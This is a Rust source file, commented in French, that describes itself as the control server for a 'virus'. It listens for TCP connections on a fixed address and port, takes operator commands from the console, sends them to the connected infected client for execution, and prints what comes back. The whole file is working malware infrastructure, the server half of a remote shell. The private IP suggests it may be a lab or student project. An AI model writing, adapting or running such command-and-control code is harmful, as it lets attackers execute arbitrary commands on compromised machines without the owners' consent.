//! Ce fichier contient le code source du serveur qui controle le virus, permettant de lui envoyer des commandes.
//!
//! Son fonctionnement se résume de la manière suivante: Il récupère d'abord une entrée d'utilisateur, la découpe et l'envoie au client, qui l'executeras ensuite.
//!Finalement, elle récupère l'output et l'affiche à l'utilisateur.

use std::net::{TcpStream};
use std::net::TcpListener;
use std::time::Duration;
use std::thread::sleep;
use std::io::{Write, Read, stdin};


///Cette fonction récupère l'entrée console
///
///Elle renvoie un string contenant la chaine de caracteres rentrés par l'utilisateur, avec les caracteres fonctionnels tel que le retour à la ligne supprimés
pub fn get_entry() -> String {
    let mut buf = String::new();

    //Lit une ligne de la console
    stdin().read_line(&mut buf).expect("Impossible de lire la console...");
    //enleve les caracteres spéciaux
    buf.replace("\n", "").replace("\r", "")
}


///Cette fonction envoie un message au client.
///
///Elle récupère une entrée console de l'utilisateur grace à la fonction "get_entry()" avant de l'envoyé au client via un processus TCP.
///Elle récupère ensuite l réponse de l'utilisateur et l'affiche dans la console.
pub fn send_message(mut stream: TcpStream) {
    let stdout = std::io::stdout();
    let mut io = stdout.lock();
    let mut buf = [0 as u8; 128];
    let time = 0;

    //On rentre dans la console
    loop {
        //On ajoute un character de ligne pour montrer que l'insertion est prete
        write!(io, "> ").expect("L'interface console à échoué...");
        //On flush la console
        io.flush().expect("flush impossible...");
        //On récupère l'input de l'utilisateur
        match &*get_entry() {
            //si quite
            "quit" => {
                //On arrete le programme
                println!("Au revoir!");
                return;
            }
            //Si une autre ligne est entré
            line => {
                //On l'envoie au serveur
                write!(stream, "{}\n", line).expect("L'envoie de message au serveur à échoué...");
                //On lit la réponse
                match stream.read(&mut buf) {
                    //Si elle est recu
                    Ok(reponse) => {
                        //si la reponse est vide
                        if reponse < 1 {
                            //on quite la fonction
                            println!("Perdu la connexion au serveur");
                            return;
                        }
                    }
                    //Si il y a une erreur
                    Err(_) => {
                        //On quite la fonction
                        println!("Perdu la connexion au serveur");
                        return;
                    }
                }
                //On affiche la réponse du serveur
                println!("Réponse du serveur : {:?}", std::str::from_utf8(&buf).unwrap().to_string());
            }
        }
        //L'application attends avant de demander une nouvelle requete
        sleep(Duration::new(0,time));
    }
}

///Cette fonction attends que le client se connecte.
pub fn launch_server() {
    //On écoute les message provenant du client
    let listener = TcpListener::bind("192.168.122.1:1234").unwrap();

    println!("En attente d'un client...");  
    //On récupère le stream
    for stream in listener.incoming() {
        //On regarde la valeur du stream
        match stream {
            Ok(stream) => {
                //Et on récupere son adresse
                let adress = match stream.peer_addr() {
                    Ok(adr) => format!("[adresse : {}]", adr),
                    Err(_) => "inconnue".to_owned()
                };

                //on affiche un message informant de la réussite de la conextion
                println!("Client connecté: {}", adress);
                send_message(stream);
            }
            Err(e) => {
                println!("La connexion à échoué : {}", e);
            }
        }
    }
}

fn main() {
    launch_server();
}